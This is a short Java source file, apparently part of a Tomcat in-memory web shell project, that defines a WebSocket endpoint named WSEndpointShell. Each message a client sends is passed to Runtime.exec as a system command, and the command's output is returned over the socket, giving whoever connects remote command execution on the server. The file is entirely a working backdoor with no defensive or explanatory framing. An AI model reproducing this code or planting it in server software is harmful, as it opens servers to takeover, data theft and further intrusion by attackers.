package com.tomcatmemshell.websocket;

import javax.websocket.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class WSEndpointShell extends Endpoint {
    @Override
    public void onOpen(javax.websocket.Session session, EndpointConfig endpointConfig) {
        session.addMessageHandler(new MessageHandler.Whole<String>() {
            @Override
            public void onMessage(String message) {
                try {
                    Process process = Runtime.getRuntime().exec(message);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    int exitCode = process.waitFor();
                    session.getBasicRemote().sendText(output.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @Override
    public void onClose(Session session, CloseReason closeReason) {
        super.onClose(session, closeReason);
    }
}
